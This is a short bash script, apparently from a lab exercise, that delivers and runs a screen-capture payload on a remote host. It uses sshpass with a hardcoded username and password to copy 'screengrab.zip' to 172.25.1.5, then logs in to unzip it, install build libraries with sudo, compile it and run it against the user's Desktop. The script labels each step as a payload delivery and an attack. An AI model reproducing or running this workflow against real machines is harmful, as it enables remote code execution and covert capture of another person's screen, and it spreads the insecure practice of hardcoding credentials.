#!/bin/bash
USERNAME="kalana"
HOSTNAME="172.25.1.5"
PASSWORD="131kalana"

echo "[1] Sending pay load"
# inject the payload to /tmp
sshpass -p $PASSWORD scp screengrab.zip $USERNAME@$HOSTNAME:/tmp

echo "[2] Executing the attack"
# unzip it, install dependencies and compile and execute screengrab
sshpass -p $PASSWORD ssh -t $USERNAME@$HOSTNAME 'cd /tmp; unzip screengrab.zip; cd screengrab; sudo apt-get install libx11-dev libpng-dev; make clean; make; ./screengrab /home/kalana/Desktop/attack'

echo "[3] Attack finished"


